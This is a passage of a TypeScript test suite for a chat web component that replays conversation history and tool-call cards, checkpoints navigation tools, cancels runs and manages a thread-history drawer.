    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-text-animation", "word");
    el.conversationStore = store;
    document.body.appendChild(el);
    await flush();

    const assistant = shadow(el).querySelector(".message--assistant");
    // Marked so the fade CSS skips it, and never wrapped into staggered .word
    // spans — so the whole transcript doesn't animate in parallel on reload.
    expect(assistant?.classList.contains("message--restored")).toBe(true);
    expect(shadow(el).querySelectorAll(".message--assistant .word")).toHaveLength(0);
    expect(assistant?.textContent).toBe("hello there world");
  });

  it("replays tool-call cards and their results from history on mount", async () => {
    const store = new SessionStorageStore();
    const tid = store.threadId();
    store.saveMessages(tid, [
      { id: "1", role: "user", content: "fill the city" },
      {
        id: "2",
        role: "assistant",
        toolCalls: [
          {
            id: "tc1",
            type: "function",
            function: { name: "fill_field", arguments: '{"name":"city","value":"Paris"}' },
          },
        ],
      },
      { id: "3", role: "tool", toolCallId: "tc1", content: '"filled"' },
      { id: "4", role: "assistant", content: "Done." },
    ] as never);

    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-tool-display", "full");
    el.conversationStore = store;
    document.body.appendChild(el);
    await flush();

    const card = shadow(el).querySelector(".tool-call");
    expect(card?.getAttribute("data-tool-name")).toBe("fill_field");
    expect(card?.getAttribute("data-status")).toBe("done");
    expect(card?.querySelector(".tool-call-args")?.textContent).toContain('"city"');
    expect(card?.querySelector(".tool-call-result")?.textContent).toContain('"filled"');
    // Text turns still render, in order, around the card.
    expect([...shadow(el).querySelectorAll(".message")].map((b) => b.textContent)).toEqual([
      "fill the city",
      "Done.",
    ]);
  });

  it("replays tool cards with malformed or non-object arguments safely", async () => {
    const store = new SessionStorageStore();
    const tid = store.threadId();
    store.saveMessages(tid, [
      {
        id: "1",
        role: "assistant",
        toolCalls: [
          { id: "a", type: "function", function: { name: "t1", arguments: "{bad json" } }, // throws → {}
          { id: "b", type: "function", function: { name: "t2", arguments: "null" } }, // null → {}
          { id: "c", type: "function", function: { name: "t3", arguments: "42" } }, // non-object → {}
        ],
      },
    ] as never);

    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.setAttribute("data-tool-display", "full");
    el.conversationStore = store;
    document.body.appendChild(el);
    await flush();

    const cards = shadow(el).querySelectorAll(".tool-call");
    expect(cards).toHaveLength(3);
    // FULL mode pretty-prints args; all three fell back to an empty object.
    for (const card of cards) {
      expect(card.querySelector(".tool-call-args")?.textContent).toBe("{}");
    }
  });

  it("resumes a checkpointed navigating tool call on mount", async () => {
    const store = new SessionStorageStore();
    const tid = store.threadId();
    store.saveMessages(tid, [{ id: "1", role: "user", content: "go to books" }] as never);
    store.saveCheckpoint(tid, { toolCallId: "nav-1" });

    const handle = makeFakeAgent({
      script: (emit) => {
        emit.text("here are the books");
        emit.textEnd("here are the books");
      },
    });
    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
    el.setAttribute("endpoint", "/agent/");
    el.conversationStore = store;
    el.agentFactory = () => handle.agent;
    document.body.appendChild(el);
    await flush();

    expect(store.loadCheckpoint(tid)).toBeNull();
    const toolMsg = handle.messages.find((m) => m.role === "tool");
    expect(toolMsg?.toolCallId).toBe("nav-1");
    expect(JSON.parse(toolMsg?.content ?? "{}").navigated).toBe(true);
    expect(shadow(el).querySelector(".message--assistant")?.textContent).toBe("here are the books");
  });

  it("checkpoints and halts on a navigating tool, then marks the card", async () => {
    let round = 0;
    let ran = false;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("nav-1", "open_changelist", { model: "Book" });
      }
      round += 1;
    });
    el.registerTool({
      name: "open_changelist",
      description: "navigate",
      parameters: { type: "object", "x-navigates": true },
      handler: () => {
        ran = true;
        return { ok: true };
      },
    });

    await send(el, "open the books");

    expect(ran).toBe(true);
    const tid = el.conversationStore.threadId();
    expect(el.conversationStore.loadCheckpoint(tid)).toEqual({ toolCallId: "nav-1" });
    expect(handle.messages.find((m) => m.role === "tool")).toBeUndefined();
    expect(shadow(el).querySelector<HTMLElement>(".tool-call")?.getAttribute("data-status")).toBe(
      "done",
    );
  });

  it("clears the checkpoint when a navigating tool handler throws", async () => {
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("nav-1", "open_changelist", {});
      }
      round += 1;
    });
    el.registerTool({
      name: "open_changelist",
      description: "navigate",
      parameters: { type: "object", "x-navigates": true },
      handler: () => {
        throw new Error("nav failed");
      },
    });

    await send(el, "open");

    const tid = el.conversationStore.threadId();
    expect(el.conversationStore.loadCheckpoint(tid)).toBeNull();
    expect(shadow(el).querySelector<HTMLElement>(".tool-call")?.getAttribute("data-status")).toBe(
      "error",
    );
  });

  it("exposes route.* tools in the catalog when a routeMap is set", () => {
    const el = mount({ endpoint: "/agent/" });
    expect(el.getTools().map((t) => t.name)).not.toContain("navigate_to_route");
    el.routeMap = [{ id: "users", path: "/admin/auth/user/" }];
    const names = el.getTools().map((t) => t.name);
    expect(names).toContain("list_routes");
    expect(names).toContain("navigate_to_route");
  });

  it("navigate_to_route routes in-page (SPA) without checkpointing", async () => {
    let round = 0;
    const navPaths: string[] = [];
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("r1", "navigate_to_route", { route_id: "users" });
      }
      round += 1;
    });
    el.routeMap = [{ id: "users", path: "/admin/auth/user/" }];
    el.navigate = (p) => navPaths.push(p);

    await send(el, "go to users");

    expect(navPaths).toEqual(["/admin/auth/user/"]);
    const tid = el.conversationStore.threadId();
    expect(el.conversationStore.loadCheckpoint(tid)).toBeNull();
    // In-page: the loop continued and posted the tool result.
    expect(handle.messages.find((m) => m.role === "tool")?.content).toContain("/admin/auth/user/");
  });

  it("navigate_to_route checkpoints + halts without a navigate callback (MPA)", async () => {
    const spy = vi.spyOn(window.location, "assign").mockImplementation(() => {});
    let round = 0;
    const { el } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("r1", "navigate_to_route", { route_id: "users" });
      }
      round += 1;
    });
    el.routeMap = [{ id: "users", path: "/admin/auth/user/" }];

    await send(el, "go");

    const tid = el.conversationStore.threadId();
    expect(el.conversationStore.loadCheckpoint(tid)).toEqual({ toolCallId: "r1" });
    expect(spy).toHaveBeenCalledWith("/admin/auth/user/");
    spy.mockRestore();
  });

  it("registerStateHook exposes read/write tools the agent can call", async () => {
    let round = 0;
    const { el, handle } = mountWithAgent((emit) => {
      if (round === 0) {
        emit.toolCall("s1", "read_cart", {});
      }
      round += 1;
    });
    el.registerStateHook({ name: "cart", read: () => ({ items: 3 }) });
    expect(el.getTools().map((t) => t.name)).toContain("read_cart");

    await send(el, "read the cart");

    expect(handle.messages.find((m) => m.role === "tool")?.content).toBe(
      JSON.stringify({ items: 3 }),
    );
  });

  it("injects the compact page map into the run context", async () => {
    const { el, handle } = mountWithAgent(() => {});
    el.getPageMap = () => ({ fields: ["title"] });

    await send(el, "x");

    expect(handle.lastRunParams?.context).toEqual([
      { description: "page_map", value: JSON.stringify({ fields: ["title"] }) },
    ]);
  });

  describe("cancel / stop a run", () => {
    /** Mount with a run held open by a gate the test releases. */
    function mountGated(streamText?: string): {
      el: AgUiChat;
      handle: ReturnType<typeof makeFakeAgent>;
      release: () => void;
    } {
      let release: () => void = () => {};
      const gate = new Promise<void>((resolve) => {
        release = resolve;
      });
      const { el, handle } = mountWithAgent(async (emit) => {
        emit.runStart();
        if (streamText !== undefined) {
          emit.text(streamText);
        }
        await gate; // held open until the test cancels and releases
      });
      return { el, handle, release };
    }

    it("clicking Stop mid-run aborts, keeps the partial text, and shows a stopped note", async () => {
      const { el, handle, release } = mountGated("partial ans");
      sendNoWait(el, "x");
      await flush();

      shadow(el).querySelector<HTMLButtonElement>(".send")?.click(); // reads "Stop"
      release();
      await flush();

      expect(handle.abortRuns).toBe(1);
      // The partial bubble survives; the affordance is a muted note, not an error.
      expect(shadow(el).querySelector(".message--assistant")?.textContent).toContain("partial ans");
      expect(shadow(el).querySelector(".stopped-note")?.textContent).toBe("⏹ Stopped");
      expect(shadow(el).textContent).not.toContain("⚠️");
      // Back to rest: the button returned to Send.
      expect(shadow(el).querySelector<HTMLButtonElement>(".send")?.textContent).toBe("Send");
    });

    it("Escape in the composer cancels a running run", async () => {
      const { el, handle, release } = mountGated();
      sendNoWait(el, "x");
      await flush();

      inputOf(el).dispatchEvent(
        new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }),
      );
      release();
      await flush();

      expect(handle.abortRuns).toBe(1);
      expect(shadow(el).querySelector(".stopped-note")).not.toBeNull();
    });

    it("Escape while idle does nothing", () => {
      const { el, handle } = mountWithAgent(() => {});
      inputOf(el).dispatchEvent(
        new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }),
      );
      expect(handle.abortRuns).toBe(0);
      expect(shadow(el).querySelector(".stopped-note")).toBeNull();
    });

    it("Stop while a confirmation card is open declines it and stops the run", async () => {
      let round = 0;
      const { el, handle } = mountWithAgent((emit) => {
        emit.runStart();
        if (round === 0) {
          emit.toolCall("tc1", "delete_user", { id: 7 });
        }
        round += 1;
      });
      el.registerTool({
        name: "delete_user",
        description: "delete",
        parameters: { type: "object", "x-destructive": true },
        handler: () => "deleted",
      });

      sendNoWait(el, "delete user 7");
      await flush(); // the run is now suspended on the confirmation card

      shadow(el).querySelector<HTMLButtonElement>(".send")?.click(); // Stop
      await flush();

      expect(shadow(el).querySelector(".confirm")?.getAttribute("data-resolved")).toBe("declined");
      expect(handle.abortRuns).toBe(1);
      expect(round).toBe(1); // the declined result did not start another round
      expect(shadow(el).querySelector(".stopped-note")).not.toBeNull();
    });

    it("newChat stops an in-flight run before discarding the client", async () => {
      const { el, handle, release } = mountGated("partial");
      sendNoWait(el, "x");
      await flush();

      el.newChat();
      release();
      await flush();

      expect(handle.abortRuns).toBe(1);
      expect(shadow(el).querySelector<HTMLButtonElement>(".send")?.textContent).toBe("Send");
    });
  });

  describe("thread drawer", () => {
    function titles(el: AgUiChat): (string | null)[] {
      return [...shadow(el).querySelectorAll(".drawer-row-title")].map((node) => node.textContent);
    }

    async function openDrawer(el: AgUiChat): Promise<void> {
      shadow(el).querySelector<HTMLButtonElement>(".header-btn--history")?.click();
      await flush();
    }

    it("opens the history drawer listing saved threads", async () => {
      const el = mount();
      el.conversationStore.saveMessages("t1", [
        { id: "u1", role: "user", content: "alpha" },
      ] as never);
      el.conversationStore.saveMessages("t2", [
        { id: "u2", role: "user", content: "beta" },
      ] as never);
      await openDrawer(el);
      expect(shadow(el).querySelector<HTMLDivElement>(".drawer")?.hidden).toBe(false);
      expect(titles(el).sort()).toEqual(["alpha", "beta"]);
    });

    it("selecting a row switches the active thread and replays it", async () => {
      const el = mount();
      el.conversationStore.saveMessages("t1", [
        { id: "u1", role: "user", content: "hello t1" },
      ] as never);
      await openDrawer(el);
      shadow(el).querySelector<HTMLButtonElement>(".drawer-row-select")?.click();
      await flush();
      expect(el.conversationStore.threadId()).toBe("t1");
      expect(shadow(el).querySelector(".message--user")?.textContent).toBe("hello t1");
      expect(shadow(el).querySelector<HTMLDivElement>(".drawer")?.hidden).toBe(true);
    });

    it("selecting the already-active thread is a no-op", async () => {
      const el = mount();
      const active = el.conversationStore.threadId();
      el.conversationStore.saveMessages(active, [
        { id: "u1", role: "user", content: "x" },
      ] as never);
      await openDrawer(el);
      shadow(el).querySelector<HTMLButtonElement>(".drawer-row-select")?.click();
      await flush();
      expect(el.conversationStore.threadId()).toBe(active);
    });

    it("the drawer's New chat starts a fresh thread", async () => {
      const el = mount();
      const first = el.conversationStore.threadId();
      el.conversationStore.saveMessages(first, [{ id: "u1", role: "user", content: "x" }] as never);
      await openDrawer(el);
      shadow(el).querySelector<HTMLButtonElement>(".drawer-new")?.click();
      await flush();
      expect(el.conversationStore.threadId()).not.toBe(first);
    });

    it("renaming a row persists the new title", async () => {
      const el = mount();
      el.conversationStore.saveMessages("t1", [
        { id: "u1", role: "user", content: "alpha" },
      ] as never);
      await openDrawer(el);
      shadow(el).querySelector<HTMLButtonElement>(".drawer-row-rename")?.click();
      const input = shadow(el).querySelector<HTMLInputElement>(".drawer-rename-input");
      if (input === null) {
        throw new Error("expected a rename input");
      }
      input.value = "Renamed";
      input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter" }));
      await flush();
      expect(titles(el)).toContain("Renamed");
    });

    it("deleting the active thread falls back to a fresh chat", async () => {
      const el = mount();
      const active = el.conversationStore.threadId();
      el.conversationStore.saveMessages(active, [
        { id: "u1", role: "user", content: "x" },
      ] as never);
      await openDrawer(el);
      shadow(el).querySelector<HTMLButtonElement>(".drawer-row-delete")?.click();
      shadow(el).querySelector<HTMLButtonElement>(".drawer-confirm-yes")?.click();
      await flush();
      expect(el.conversationStore.threadId()).not.toBe(active);
      expect(shadow(el).querySelector(".drawer-empty")).not.toBeNull();
    });

    it("deleting a non-active thread keeps the current conversation", async () => {
      const el = mount();
      const active = el.conversationStore.threadId();
      el.conversationStore.saveMessages(active, [
        { id: "u1", role: "user", content: "current" },
      ] as never);
      el.conversationStore.saveMessages("other", [
        { id: "u2", role: "user", content: "other thread" },
      ] as never);
      await openDrawer(el);
      const otherRow = [...shadow(el).querySelectorAll<HTMLDivElement>(".drawer-row")].find(
        (row) => row.querySelector(".drawer-row-title")?.textContent === "other thread",
      );
      if (otherRow === undefined) {
        throw new Error("expected the 'other' row");
      }
      otherRow.querySelector<HTMLButtonElement>(".drawer-row-delete")?.click();
      otherRow.querySelector<HTMLButtonElement>(".drawer-confirm-yes")?.click();
      await flush();
      expect(el.conversationStore.threadId()).toBe(active);
      expect(titles(el)).toEqual(["current"]);
    });

    it("routes the drawer through data-threads-url when set", async () => {
      const fetchMock = vi.fn().mockResolvedValue({
        ok: true,
        json: async () => ({
          threads: [
            { thread_id: "s1", title: "Server thread", updated_at: null, preview: "from server" },
          ],
        }),
      });
      vi.stubGlobal("fetch", fetchMock);
      try {
        const el = mount({ "data-threads-url": "/agent/threads/" });
        await flush();
        expect(el.conversationStore).toBeInstanceOf(RemoteConversationStore);
        shadow(el).querySelector<HTMLButtonElement>(".header-btn--history")?.click();
        await flush();
        expect(titles(el)).toEqual(["Server thread"]);
      } finally {
        vi.unstubAllGlobals();
      }
    });
  });
});
